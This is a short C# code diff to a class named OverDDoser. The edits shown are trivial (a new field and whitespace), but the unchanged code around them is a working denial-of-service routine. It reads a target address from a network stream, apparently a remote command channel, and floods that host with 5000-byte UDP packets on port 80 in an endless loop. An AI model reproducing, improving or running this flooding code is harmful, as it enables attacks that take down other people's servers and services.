@@ -12,16 +12,18 @@ namespace OverDDoser
 {
     class OverDDoser
     {
-        
+        public int a;
         public OverDDoser(string[] Args)
         {
+            int a = 10;
+            this.a = a;
             Form1 f = new Form1();
             f.ShowDialog();
             NetworkStream s = f.stream;
             StreamReader sr = new StreamReader(s);
             string Address = sr.ReadLine();
-            using (UdpClient c = new UdpClient(80)) 
-                while(true)
+            using (UdpClient c = new UdpClient(80))
+                while (true)
                     c.Send(new byte[5000], 5000, Address, 80);
         }
     }
